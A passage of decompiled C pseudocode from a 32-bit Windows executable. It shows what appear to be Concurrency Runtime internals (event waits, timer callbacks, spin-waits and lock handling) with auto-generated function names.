  _DWORD **v2; // esi
  _DWORD *v3; // edi
  _DWORD *v4; // ebx
  char v5; // al

  v2 = a1;
  v3 = 0;
  if ( a1 )
  {
    do
    {
      v4 = *v2;
      if ( a2 )
        v5 = sub_46E2B3(v2);
      else
        v5 = sub_46E267(v2);
      if ( v5 )
      {
        *v2 = v3;
        v3 = v2;
      }
      v2 = (_DWORD **)v4;
    }
    while ( v4 );
  }
  return v3;
}

//----- (0046E267) --------------------------------------------------------
int __thiscall sub_46E267(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 16))(this[1]);
}

//----- (0046E280) --------------------------------------------------------
char __thiscall sub_46E280(_DWORD *this)
{
  if ( this[8] >= this[7] )
  {
    (*(void (__thiscall **)(_DWORD *))(*this + 4))(this);
    return 0;
  }
  if ( *((_BYTE *)this + 41) )
  {
    (*(void (__thiscall **)(_DWORD *))(*this + 8))(this);
    return 0;
  }
  return 1;
}

//----- (0046E2B3) --------------------------------------------------------
int __thiscall sub_46E2B3(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 12))(this[1]);
}

//----- (0046E2CC) --------------------------------------------------------
char __thiscall sub_46E2CC(_BYTE *this)
{
  if ( !this[36] )
    return 1;
  (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)this + 8))(this);
  return 0;
}

//----- (0046E2F0) --------------------------------------------------------
char __thiscall sub_46E2F0(_BYTE *this)
{
  char v3[4]; // [esp+4h] [ebp-4h] BYREF

  if ( !this[41] )
    return 1;
  if ( (**(unsigned __int8 (__thiscall ***)(_BYTE *, char *, _DWORD))this)(this, v3, 0) )
    (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)this + 8))(this);
  return 0;
}
// 46E2F0: using guessed type char var_4[4];

//----- (0046E333) --------------------------------------------------------
char __thiscall sub_46E333(_DWORD *this)
{
  char v2[4]; // [esp+4h] [ebp-4h] BYREF

  if ( this[8] < this[7] && !*((_BYTE *)this + 41) )
    return 1;
  (*(void (__thiscall **)(_DWORD *, char *, _DWORD))*this)(this, v2, 0);
  return 0;
}
// 46E333: using guessed type char var_4[4];

//----- (0046E369) --------------------------------------------------------
int __thiscall sub_46E369(_DWORD *this, int a2)
{
  int result; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  result = a2;
  if ( !a2 )
  {
    sub_45ABA0(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  this[2] = 0;
  this[1] = a2;
  return result;
}

//----- (0046E398) --------------------------------------------------------
int __thiscall sub_46E398(_DWORD *this, int a2)
{
  int result; // eax

  if ( a2 )
  {
    *this = a2;
    result = 1;
    this[1] = 1;
  }
  else
  {
    result = 4;
  }
  this[2] = result;
  return result;
}

//----- (0046E3B6) --------------------------------------------------------
int __thiscall sub_46E3B6(_DWORD *this, int a2)
{
  int result; // eax

  if ( a2 )
  {
    this[1] = 0;
    *this = a2;
    result = 1;
  }
  else
  {
    result = 4;
  }
  this[2] = result;
  return result;
}

//----- (0046E3D5) --------------------------------------------------------
char __thiscall sub_46E3D5(int this)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  bool v9; // zf

  while ( 1 )
  {
    v2 = *(_DWORD *)(this + 8);
    if ( v2 )
      break;
    *(_DWORD *)(this + 8) = 0;
    v3 = sub_46F210();
    sub_46E398((_DWORD *)this, v3);
  }
  v4 = v2 - 1;
  if ( !v4 )
  {
    _mm_pause();
    v9 = (*(_DWORD *)this)-- == 1;
    if ( v9 )
      *(_DWORD *)(this + 8) = 3 - (*(_DWORD *)(this + 4) != 0);
    return 1;
  }
  v5 = v4 - 1;
  if ( !v5 )
  {
    v9 = (*(_DWORD *)(this + 4))-- == 1;
    if ( v9 )
      *(_DWORD *)(this + 8) = 3;
    (*(void (__thiscall **)(_DWORD))(this + 12))(*(_DWORD *)(this + 12));
    return 1;
  }
  v6 = v5 - 1;
  if ( v6 )
  {
    if ( v6 == 1 )
      (*(void (__thiscall **)(_DWORD))(this + 12))(*(_DWORD *)(this + 12));
  }
  else
  {
    *(_DWORD *)(this + 8) = 0;
    v7 = sub_46F210();
    sub_46E398((_DWORD *)this, v7);
  }
  return 0;
}

//----- (0046E45E) --------------------------------------------------------
char __thiscall sub_46E45E(_DWORD *this)
{
  char v2; // bl
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  bool v10; // zf

  v2 = 0;
  while ( 1 )
  {
    v3 = this[2];
    if ( v3 )
      break;
    this[2] = 0;
    v4 = sub_46F210();
    sub_46E3B6(this, v4);
  }
  v5 = v3 - 1;
  if ( v5 )
  {
    v6 = v5 - 1;
    if ( v6 )
    {
      v7 = v6 - 1;
      if ( !v7 )
      {
        this[2] = 0;
        v8 = sub_46F210();
        sub_46E3B6(this, v8);
        return 0;
      }
      if ( v7 != 1 )
        return 0;
    }
    else
    {
      v10 = this[1]-- == 1;
      if ( v10 )
        this[2] = 3;
      v2 = 1;
    }
    _mm_pause();
    return v2;
  }
  else
  {
    _mm_pause();
    v10 = (*this)-- == 1;
    if ( v10 )
      this[2] = 3 - (this[1] != 0);
    return 1;
  }
}

//----- (0046E4D5) --------------------------------------------------------
bool __thiscall sub_46E4D5(int this, DWORD a2)
{
  int *v3; // edi
  int v4; // eax
  void *v6; // eax

  if ( !*(_BYTE *)(this + 24) )
    return 0;
  v3 = (int *)(this + 20);
  if ( sub_471D09() < 3 )
  {
    v6 = (void *)sub_46DEF0();
    return sub_46F574((PHANDLE)(this + 20), v6, (WAITORTIMERCALLBACK)sub_46DECE, (PVOID)this, a2, 0, 0x20u);
  }
  else
  {
    v4 = sub_46FB7C(a2, (int)sub_46DE43, this, 0);
    *v3 = v4;
    return v4 != 0;
  }
}
// 471D09: using guessed type int sub_471D09(void);

//----- (0046E538) --------------------------------------------------------
void __thiscall sub_46E538(int this, unsigned __int8 a2)
{
  void *v3; // eax
  void *v4; // [esp-8h] [ebp-Ch]

  if ( *(_BYTE *)(this + 24) )
  {
    if ( sub_471D09() < 3 )
    {
      v4 = *(void **)(this + 20);
      v3 = (void *)sub_46DEF0();
      sub_46F594(v3, v4, (HANDLE)((a2 ^ 1) - 1));
    }
    else if ( a2 )
    {
      if ( *(_DWORD *)(this + 20) )
        sub_46F9F0(*(_DWORD *)(this + 20));
    }
  }
}
// 471D09: using guessed type int sub_471D09(void);

//----- (0046E584) --------------------------------------------------------
void __thiscall sub_46E584(_DWORD *this)
{
  _DWORD **v2; // edi
  _DWORD **v3; // ebx
  void *v4[7]; // [esp+4h] [ebp-20h] BYREF
  int v5; // [esp+20h] [ebp-4h] BYREF

  if ( *this )
  {
    sub_46EDA0((int *)v4, (int)(this + 1));
    v2 = (_DWORD **)*this;
    *this = 0;
    sub_46EDD2(v4);
    if ( v2 )
    {
      do
      {
        v5 = 0;
        sub_46DFD6((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v2, (int)&v5);
        v3 = (_DWORD **)*v2;
        sub_46DDAD(v2);
        if ( v5 )
          (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 12))(v5);
        v2 = v3;
      }
      while ( v3 );
    }
  }
}

//----- (0046E5EF) --------------------------------------------------------
void __thiscall sub_46E5EF(_DWORD *this)
{
  _DWORD **v2; // edi
  _DWORD **v3; // esi
  void *v4[7]; // [esp+10h] [ebp-2Ch] BYREF
  int v5[4]; // [esp+2Ch] [ebp-10h] BYREF

  if ( *this )
  {
    sub_46EDA0((int *)v4, (int)(this + 1));
    v2 = (_DWORD **)*this;
    v5[3] = 0;
    v5[0] = 0;
    if ( !v2 )
      goto LABEL_7;
    do
    {
      if ( (unsigned __int8)sub_46DFD6((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v2, (int)v5) )
        break;
      v3 = (_DWORD **)*v2;
      sub_46DDAD(v2);
      v2 = v3;
    }
    while ( v3 );
    if ( v2 )
    {
      *this = *v2;
      sub_46DDAD(v2);
      (*(void (__thiscall **)(int))(*(_DWORD *)v5[0] + 12))(v5[0]);
    }
    else
    {
LABEL_7:
      *this = 0;
    }
    sub_46EDD2(v4);
  }
}

//----- (0046E673) --------------------------------------------------------
int __thiscall sub_46E673(volatile __int32 *this)
{
  int v1; // edi
  int v2; // ebx
  _DWORD *v3; // esi
  int v4; // ecx
  _DWORD *v5; // eax
  unsigned int v6; // eax
  void *v7; // esp
  _DWORD *v8; // eax
  _DWORD *v9; // edi
  volatile __int32 *v10; // ecx
  _DWORD v12[4]; // [esp+0h] [ebp-54h] BYREF
  void *v13; // [esp+10h] [ebp-44h] BYREF
  void **v14; // [esp+2Ch] [ebp-28h] BYREF
  int v15; // [esp+30h] [ebp-24h]
  int v16; // [esp+34h] [ebp-20h]
  int v17; // [esp+38h] [ebp-1Ch] BYREF
  volatile __int32 *v18; // [esp+3Ch] [ebp-18h]
  int v19; // [esp+40h] [ebp-14h]
  int v20; // [esp+50h] [ebp-4h]

  v18 = this;
  v14 = &Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable';
  v1 = 0;
  v15 = 0;
  v19 = 0;
  v2 = 0;
  v16 = 0;
  v20 = 1;
  sub_46EDA0(this + 2);
  v3 = (_DWORD *)_InterlockedExchange(v18, 1);
  if ( (unsigned int)v3 <= 1 )
    goto LABEL_19;
  v4 = 0;
  v5 = v3;
  do
  {
    v5 = (_DWORD *)*v5;
    ++v4;
  }
  while ( v5 );
  v6 = 4 * v4 < (unsigned int)(4 * v4 + 8) ? 4 * v4 + 8 : 0;
  if ( v6 )
  {
    if ( v6 > 0x400 )
    {
      v8 = malloc(v6);
      if ( !v8 )
        goto LABEL_12;
      *v8 = 56797;
    }
    else
    {
      v7 = alloca(v6);
      v8 = v12;
      if ( !v12 )
        goto LABEL_12;
      v12[0] = 52428;
    }
    v8 += 2;
  }
  else
  {
    v8 = 0;
  }
LABEL_12:
  v2 = 0;
  v19 = sub_46E369(&v14, (int)v8);
  do
  {
    v9 = (_DWORD *)*v3;
    if ( (unsigned __int8)sub_46DFD6((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v3, (int)&v17) )
    {
      v10 = v18;
      *v3 = *((_DWORD *)v18 + 1);
      *((_DWORD *)v10 + 1) = v3;
    }
    if ( v17 )
      *(_DWORD *)(v19 + 4 * v2++) = v17;
    v3 = v9;
  }
  while ( v9 );
  v1 = v19;
LABEL_19:
  LOBYTE(v20) = 0;
  sub_46EDD2(&v13);
  while ( v2 )
  {
    --v2;
    (*(void (__thiscall **)(_DWORD, _DWORD))(**(_DWORD **)(v1 + 4 * v2) + 12))(*(_DWORD *)(v1 + 4 * v2), v12[0]);
    v1 = v19;
  }
  return _freea_crt(v15);
}
// 46E6C4: conditional instruction was optimized away because esi.4>=2u
// 46E721: conditional instruction was optimized away because esi.4>=2u
// 46C0C7: using guessed type _DWORD __cdecl _freea_crt(_DWORD);
// 46EDA0: using guessed type _DWORD __stdcall sub_46EDA0(_DWORD);
// 4C08B0: using guessed type void *Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable';

//----- (0046E792) --------------------------------------------------------
signed __int32 __thiscall sub_46E792(_DWORD ***this, void *a2)
{
  char v4[12]; // [esp+10h] [ebp-50h] BYREF
  _DWORD *v5; // [esp+1Ch] [ebp-44h] BYREF
  void *v6[9]; // [esp+38h] [ebp-28h] BYREF
  int v7; // [esp+5Ch] [ebp-4h]

  sub_46DBD0((int)v4, 0);
  sub_46EDA0((int *)v6, (int)(this + 1));
  v7 = 0;
  v5 = sub_46E22D(*this, 1);
  *this = &v5;
  sub_46F32A(a2);
  v7 = -1;
  sub_46EDD2(v6);
  sub_46FD30();
  return sub_46F253(a2);
}
// 46E792: using guessed type char var_50[12];

//----- (0046E7F6) --------------------------------------------------------
unsigned int __thiscall sub_46E7F6(_DWORD ***this, DWORD a2)
{
  void *v4; // [esp+10h] [ebp-54h] BYREF
  _DWORD v5[4]; // [esp+2Ch] [ebp-38h] BYREF
  int v6[2]; // [esp+3Ch] [ebp-28h] BYREF
  signed __int32 v7; // [esp+44h] [ebp-20h] BYREF
  int v8[2]; // [esp+48h] [ebp-1Ch] BYREF
  _DWORD ***v9; // [esp+50h] [ebp-14h] BYREF
  int v10; // [esp+54h] [ebp-10h]
  int v11; // [esp+60h] [ebp-4h]

  if ( a2 == -1 )
  {
    v5[3] = sub_46FD09;
    v10 = 0;
    v5[2] = 0;
    while ( *this != (_DWORD **)1 )
    {
      if ( !sub_46E45E(v5) )
      {
        sub_46DC27(v6);
        v6[0] = (int)&Concurrency::details::SingleWaitBlock::`vftable';
        v8[1] = (int)v6;
        sub_46EDA0(this + 2);
        v11 = 0;
        if ( *this == (_DWORD **)1 )
        {
          LOBYTE(v10) = 1;
        }
        else
        {
          v8[0] = (int)sub_46E22D(*this, 1);
          *this = (_DWORD **)v8;
        }
        v11 = -1;
        sub_46EDD2(&v4);
        if ( !(_BYTE)v10 && v7 != 1 && _InterlockedCompareExchange(&v7, 2, 0) != 1 )
          sub_46FD30();
        return 0;
      }
    }
    return 0;
  }
  else if ( a2 )
  {
    v9 = this;
    return sub_46E9BA(&v9, 1u, 1, a2);
  }
  else
  {
    return -(*this != (_DWORD **)1);
  }
}
// 46EDA0: using guessed type _DWORD __stdcall sub_46EDA0(_DWORD);
// 4C082C: using guessed type void *Concurrency::details::SingleWaitBlock::`vftable';

//----- (0046E8D2) --------------------------------------------------------
char __thiscall sub_46E8D2(_DWORD ***this, void *a2, DWORD a3)
{
  void *v4; // eax
  int v5; // edi
  bool v6; // bl
  void *v7[7]; // [esp+10h] [ebp-3Ch] BYREF
  char pExceptionObject[12]; // [esp+2Ch] [ebp-20h] BYREF
  void *v9; // [esp+38h] [ebp-14h]
  _DWORD ***v10; // [esp+3Ch] [ebp-10h]
  int v11; // [esp+48h] [ebp-4h]

  v10 = this;
  if ( !a3 )
    return 0;
  if ( a3 == -1 )
  {
    sub_46E792(this, a2);
    return 1;
  }
  else
  {
    v4 = operator new(0x28u);
    v9 = v4;
    v5 = 0;
    v11 = 0;
    if ( v4 )
      v5 = sub_46DBD0((int)v4, 1);
    v11 = -1;
    sub_46EDA0((int *)v7, (int)(v10 + 1));
    v11 = 1;
    *(_DWORD *)(v5 + 12) = sub_46E22D(*v10, 1);
    *v10 = (_DWORD **)(v5 + 12);
    if ( !sub_46E4D5(v5, a3) )
    {
      sub_45ABA0(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
    sub_46F32A(a2);
    v11 = -1;
    sub_46EDD2(v7);
    sub_46FD30();
    v6 = *(_BYTE *)(v5 + 36) == 0;
    (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 8))(v5);
    sub_46F253(a2);
    return v6;
  }
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0046E9BA) --------------------------------------------------------
unsigned int __cdecl sub_46E9BA(_DWORD *a1, unsigned int a2, char a3, DWORD a4)
{
  DWORD v5; // edi
  unsigned int v6; // ebx
  unsigned int i; // eax
  bool v8; // al
  unsigned int v9; // edx
  _DWORD *v10; // eax
  char *v11; // ecx
  _DWORD *v12; // eax
  char *v13; // ecx
  unsigned int v14; // eax
  int v15; // edi
  char *v16; // ebx
  unsigned int v17; // esi
  int v18; // esi
  int v19; // eax
  int v20; // eax
  void *v21; // eax
  int v22; // eax
  volatile signed __int32 *v23; // [esp-10h] [ebp-B4h]
  void *v24[7]; // [esp+10h] [ebp-94h] BYREF
  char v25[12]; // [esp+2Ch] [ebp-78h] BYREF
  char v26[12]; // [esp+38h] [ebp-6Ch] BYREF
  char v27[12]; // [esp+44h] [ebp-60h] BYREF
  char pExceptionObject[12]; // [esp+50h] [ebp-54h] BYREF
  char v29[12]; // [esp+5Ch] [ebp-48h] BYREF
  int v30; // [esp+68h] [ebp-3Ch] BYREF
  unsigned int v31; // [esp+6Ch] [ebp-38h]
  int v32; // [esp+74h] [ebp-30h]
  volatile signed __int32 *v33; // [esp+78h] [ebp-2Ch]
  int v34; // [esp+7Ch] [ebp-28h]
  unsigned int v35; // [esp+84h] [ebp-20h]
  int v36; // [esp+88h] [ebp-1Ch] BYREF
  _DWORD ***v37; // [esp+8Ch] [ebp-18h]
  char *v38; // [esp+90h] [ebp-14h]
  char v39; // [esp+97h] [ebp-Dh]
  int v40; // [esp+A0h] [ebp-4h]

  if ( !a1 )
  {
    sub_46A08B(v29, (int)"pEvents");
    _CxxThrowException(v29, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !a2 )
    return 0;
  v5 = a4;
  v6 = -1;
  if ( a2 == 1 && (!a4 || a4 == -1) )
  {
    if ( !*a1 )
    {
      sub_46A08B(pExceptionObject, (int)"pEvents");
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
    }
    return sub_46E7F6(a4);
  }
  for ( i = 0; i < a2; ++i )
  {
    if ( !a1[i] )
    {
      sub_46A08B(v27, (int)"pEvents");
      _CxxThrowException(v27, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
    }
  }
  v8 = a4 && a4 != -1;
  sub_46DB49(&v30, a3, a2, a4 != -1, v8);
  v40 = 0;
  v9 = 0;
  v39 = 0;
  v35 = 0;
  v38 = (char *)(v30 + v32);
  while ( 1 )
  {
    v37 = (_DWORD ***)a1[v9];
    sub_46EDA0(v37 + 2);
    ++v34;
    LOBYTE(v40) = 1;
    if ( *v37 == (_DWORD **)1 )
      break;
    v12 = sub_46E22D(*v37, 1);
    v13 = v38;
    *(_DWORD *)v38 = v12;
    *v37 = (_DWORD **)v13;
LABEL_27:
    LOBYTE(v40) = 0;
    sub_46EDD2(v24);
    v9 = v35 + 1;
    v35 = v9;
    v38 += v31;
    if ( v9 >= a2 )
      goto LABEL_36;
  }
  if ( a3 )
  {
    if ( (unsigned __int8)sub_46DFD6((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v38, (int)&v36) )
    {
      v10 = sub_46E22D(v37[1], 0);
      v11 = v38;
      *(_DWORD *)v38 = v10;
      v37[1] = (_DWORD **)v11;
    }
    if ( v36 )
      v39 = 1;
    goto LABEL_27;
  }
  sub_46DFD6((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v38, (int)&v36);
  if ( v36 )
    v39 = 1;
  v14 = v35 + 1;
  if ( v35 + 1 < a2 )
  {
    v15 = v34;
    v16 = (char *)(v30 + v32 + v14 * v31);
    v17 = a2 - v14;
    do
    {
      v34 = ++v15;
      sub_46DFD6((int (__thiscall ****)(_DWORD, _DWORD, _DWORD))v16, (int)&v36);
      v16 += v31;
      --v17;
    }
    while ( v17 );
    v5 = a4;
    v6 = -1;
  }
  LOBYTE(v40) = 0;
  sub_46EDD2(v24);
LABEL_36:
  if ( v39 || *((_DWORD *)v33 + 2) == 1 || _InterlockedCompareExchange(v33 + 2, 2, 0) == 1 )
  {
    v18 = (int)v33;
  }
  else
  {
    if ( v5 )
    {
      if ( v5 == -1 || *((_DWORD *)v33 + 5) )
      {
        v18 = (int)v33;
      }
      else
      {
        v19 = sub_471D09();
        v18 = (int)v33;
        if ( v19 < 3 )
        {
          v23 = v33;
          v21 = (void *)sub_46DEF0();
          if ( !sub_46F574((PHANDLE)(v18 + 16), v21, (WAITORTIMERCALLBACK)sub_46DE76, (PVOID)v23, v5, 0, 0x20u) )
          {
            sub_45ABA0(v25);
            _CxxThrowException(v25, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
          }
        }
        else
        {
          v20 = sub_46FB7C(v5, (int)sub_46DDE5, (int)v33, 0);
          *(_DWORD *)(v18 + 16) = v20;
          if ( !v20 )
          {
            sub_45ABA0(v26);
            _CxxThrowException(v26, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
          }
        }
        ++v34;
      }
    }
    else
    {
      v18 = (int)v33;
      if ( _InterlockedIncrement(v33 + 5) == 1 )
      {
        *(_DWORD *)(v18 + 12) = 0;
        *(_BYTE *)(v18 + 41) = 1;
        goto LABEL_53;
      }
    }
    sub_46FD30();
  }
LABEL_53:
  v22 = *(_DWORD *)(v18 + 12);
  if ( v22 )
    v6 = (v22 - v32 - v30) / v31;
  sub_46DC95(&v30);
  return v6;
}
// 46EA24: conditional instruction was optimized away because %arg_4.4!=0
// 46EA7F: conditional instruction was optimized away because %arg_4.4!=0
// 46E7F6: using guessed type _DWORD __stdcall sub_46E7F6(_DWORD);
// 46EDA0: using guessed type _DWORD __stdcall sub_46EDA0(_DWORD);
// 471D09: using guessed type int sub_471D09(void);

//----- (0046EC9C) --------------------------------------------------------
HANDLE *__thiscall sub_46EC9C(HANDLE *this, DWORD a2)
{
  HANDLE *v3; // edi
  int v4; // eax
  void *v5; // eax
  char pExceptionObject[12]; // [esp+Ch] [ebp-18h] BYREF
  char v8[12]; // [esp+18h] [ebp-Ch] BYREF

  this[1] = 0;
  v3 = this + 3;
  this[2] = HANDLE_FLAG_INHERIT;
  this[3] = 0;
  this[4] = 0;
  this[5] = 0;
  *this = sub_46EE8E();
  if ( a2 != -1 )
  {
    if ( sub_471D09() < 3 )
    {
      v5 = (void *)sub_46DEF0();
      if ( !sub_46F574(v3, v5, (WAITORTIMERCALLBACK)sub_46EF16, this, a2, 0, 0x20u) )
      {
        sub_45ABA0(pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
      }
    }
    else
    {
      v4 = sub_46FB7C(a2, (int)sub_46EECF, (int)this, 0);
      *v3 = (HANDLE)v4;
      if ( !v4 )
      {
        sub_45ABA0(v8);
        _CxxThrowException(v8, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
      }
    }
  }
  return this;
}
// 471D09: using guessed type int sub_471D09(void);

//----- (0046ED40) --------------------------------------------------------
struct _RTL_CRITICAL_SECTION *__thiscall sub_46ED40(struct _RTL_CRITICAL_SECTION *this)
{
  sub_46F7CF(this, dword_4E8190);
  return this;
}
// 4E8190: using guessed type int dword_4E8190;

//----- (0046ED55) --------------------------------------------------------
_DWORD *__thiscall sub_46ED55(_DWORD *this)
{
  _DWORD *result; // eax

  *this = 0;
  result = this;
  this[1] = 0;
  return result;
}

//----- (0046ED65) --------------------------------------------------------
_DWORD *__thiscall sub_46ED65(_DWORD *this)
{
  this[6] = 0;
  this[7] = 0;
  *this = 0;
  this[1] = 0;
  this[3] = 0;
  this[2] = 2;
  this[4] = 0;
  this[5] = 0;
  return this;
}

//----- (0046ED85) --------------------------------------------------------
char *__thiscall sub_46ED85(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &Concurrency::improper_lock::`vftable';
  return this;
}
// 4C08C0: using guessed type void *Concurrency::improper_lock::`vftable';

//----- (0046EDA0) --------------------------------------------------------
int *__thiscall sub_46EDA0(int *this, int a2)
{
  _DWORD *v3; // esi

  v3 = this + 1;
  *this = a2;
  sub_46EC9C((HANDLE *)this + 1, 0xFFFFFFFF);
  sub_46F0B3(*this, v3, 1);
  return this;
}

//----- (0046EDCA) --------------------------------------------------------
void __thiscall sub_46EDCA(LPCRITICAL_SECTION lpCriticalSection)
{
  DeleteCriticalSection(lpCriticalSection);
}

//----- (0046EDD2) --------------------------------------------------------
void __thiscall sub_46EDD2(void **this)
{
  sub_46F32A(*this);
}

//----- (0046EE08) --------------------------------------------------------
int __thiscall sub_46EE08(_DWORD *this, unsigned int a2)
{
  int v3; // edi
  unsigned int v4; // edx
  unsigned int v5; // edi
  _DWORD v7[4]; // [esp+8h] [ebp-10h] BYREF

  v3 = sub_471D0E();
  if ( (this[2] & 4) == 0 )
  {
    v4 = (this[2] & 2) != 0 ? (this[2] >> 3) - (a2 >> 3) : 1;
    v5 = v3 + 2;
    if ( v4 <= v5 )
    {
      v7[2] = 0;
      v7[3] = sub_46FD09;
      sub_46E3B6(v7, dword_4E8190 + dword_4E8190 * (v4 - 1) / v5);
      while ( (this[2] & 1) != 0 && sub_46E45E(v7) )
        ;
    }
  }
  return sub_46FD30();
}
// 4E8190: using guessed type int dword_4E8190;

//----- (0046EE8E) --------------------------------------------------------
_DWORD *sub_46EE8E()
{
  _DWORD *result; // eax

  if ( dword_4E81A4 >= 0 )
    return sub_474E69();
  result = sub_46F930(dword_4F0C08);
  if ( !result )
    return sub_474E69();
  return result;
}
// 4E81A4: using guessed type int dword_4E81A4;
// 4F0C08: using guessed type int dword_4F0C08;

//----- (0046EEB0) --------------------------------------------------------
void __thiscall sub_46EEB0(int this)
{
  if ( *(_DWORD *)(this + 12) )
  {
    if ( _InterlockedIncrement((volatile signed __int32 *)(this + 20)) == 2 )
      sub_46C87D((void *)this);
  }
}

//----- (0046EECF) --------------------------------------------------------
HMODULE __stdcall sub_46EECF(int a1, volatile signed __int32 *a2, int a3)
{
  if ( _InterlockedCompareExchange(a2 + 4, 2, 0) )
    sub_46EEB0((int)a2);
  else
    (*(void (__thiscall **)(volatile signed __int32))(**(_DWORD **)a2 + 12))(*a2);
  return sub_46FC14(a1, a3);
}

//----- (0046EF16) --------------------------------------------------------
void __stdcall sub_46EF16(volatile signed __int32 *a1, int a2)
{
  void *v2; // eax
  void *v3; // [esp-8h] [ebp-Ch]

  v3 = (void *)*((_DWORD *)a1 + 3);
  v2 = (void *)sub_46DEF0();
  sub_46F594(v2, v3, 0);
  if ( _InterlockedCompareExchange(a1 + 4, 2, 0) )
    sub_46EEB0((int)a1);
  else
    (*(void (__thiscall **)(volatile signed __int32))(**(_DWORD **)a1 + 12))(*a1);
}

//----- (0046EF63) --------------------------------------------------------
void __thiscall sub_46EF63(int this)
{
  if ( *(_DWORD *)(this + 12) )
  {
    if ( _InterlockedExchange((volatile __int32 *)(this + 16), 1) == 2 )
    {
      sub_46FD30();
      sub_46EEB0(this);
    }
  }
}

//----- (0046EF88) --------------------------------------------------------
char __thiscall sub_46EF88(volatile signed __int32 *this)
{
  if ( _InterlockedCompareExchange(this + 4, 1, 0) )
    return 0;
  *((_DWORD *)this + 2) &= ~1u;
  (*(void (__thiscall **)(volatile signed __int32))(**(_DWORD **)this + 12))(*this);
  return 1;
}

//----- (0046EFBA) --------------------------------------------------------
_DWORD *__thiscall sub_46EFBA(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  unsigned int v3; // ebx

  result = (_DWORD *)(this[2] >> 1);
  if ( (this[2] & 2) == 0 )
  {
    result = (_DWORD *)(a2[2] >> 1);
    if ( (a2[2] & 2) != 0 )
    {
      v3 = (a2[2] + 8) & 0xFFFFFFFA;
      if ( (a2[2] & 1) != 0
        && ((a2[2] & 4) != 0 || !a2[3] && (*(unsigned __int8 (__thiscall **)(_DWORD))(*(_DWORD *)*a2 + 16))(*a2)) )
      {
        v3 |= 4u;
      }
      result = this;
      this[2] |= v3;
    }
  }
  return result;
}

//----- (0046F022) --------------------------------------------------------
int __thiscall sub_46F022(_DWORD *this)
{
  int result; // eax
  char v3[8]; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+Ch] [ebp-8h]
  int (*v5)(); // [esp+10h] [ebp-4h]

  result = this[1];
  v4 = 0;
  v5 = sub_46FD09;
  while ( !result )
  {
    sub_46E3D5((int)v3);
    result = this[1];
  }
  return result;
}
// 46F022: using guessed type char var_10[8];

//----- (0046F04D) --------------------------------------------------------
void __thiscall sub_46F04D(LPCRITICAL_SECTION lpCriticalSection)
{
  EnterCriticalSection(lpCriticalSection);
}

//----- (0046F055) --------------------------------------------------------
signed __int32 __thiscall sub_46F055(volatile signed __int32 *this)
{
  int *v2; // edi
  signed __int32 v3; // edx
  signed __int32 result; // eax

  v2 = (int *)(this + 1);
  while ( 1 )
  {
    if ( *v2 > 0 )
      sub_46F216(v2, 0, -1);
    v3 = *this;
    if ( *this != -1 )
    {
      result = _InterlockedCompareExchange(this, v3 + 1, v3);
      if ( result == v3 )
        break;
    }
  }
  return result;
}

//----- (0046F085) --------------------------------------------------------
signed __int32 __thiscall sub_46F085(volatile signed __int32 *this)
{
  signed __int32 result; // eax

  _InterlockedIncrement(this + 1);
  for ( result = _InterlockedCompareExchange(this, -1, 0); result; result = _InterlockedCompareExchange(this, -1, 0) )
    sub_46F216(this, 0, -1);
  return result;
}

//----- (0046F0B3) --------------------------------------------------------
bool __thiscall sub_46F0B3(int this, _DWORD *a2, char a3)
{
  _DWORD *v4; // ebx
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  if ( *a2 == *(_DWORD *)this )
  {
    sub_477800(pExceptionObject, (int)"Lock already taken");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_lock_Concurrency__);
  }
  v4 = (_DWORD *)_InterlockedExchange((volatile __int32 *)(this + 28), (__int32)a2);
  if ( v4 )
  {
    sub_46EFBA(a2, v4);
    v4[1] = a2;
    sub_46EE08(a2, *(_DWORD *)(this + 8));
    if ( a2[4] != 2 )
      sub_46EFBA(a2, (_DWORD *)this);
  }
  else
  {
    *(_DWORD *)(this + 24) = a2;
    sub_46EFBA(a2, (_DWORD *)this);
    a2[2] &= ~1u;
    sub_46EF63((int)a2);
  }
  if ( a3 )
  {
    *(_DWORD *)(this + 8) = a2[2];
    *(_DWORD *)(this + 4) = a2[1];
    *(_DWORD *)this = *a2;
    *(_DWORD *)(this + 24) = a2;
  }
  return a2[4] != 2;
}

//----- (0046F14E) --------------------------------------------------------
int __thiscall sub_46F14E(int *this)
{
  int *v1; // ecx
  int result; // eax

  v1 = this + 1;
  if ( *v1 > 0 )
    return sub_46F216(v1, 0, -1);
  return result;
}

//----- (0046F164) --------------------------------------------------------
void __thiscall sub_46F164(_DWORD *this)
{
  if ( this[7] )
  {
    sub_46F253(this);
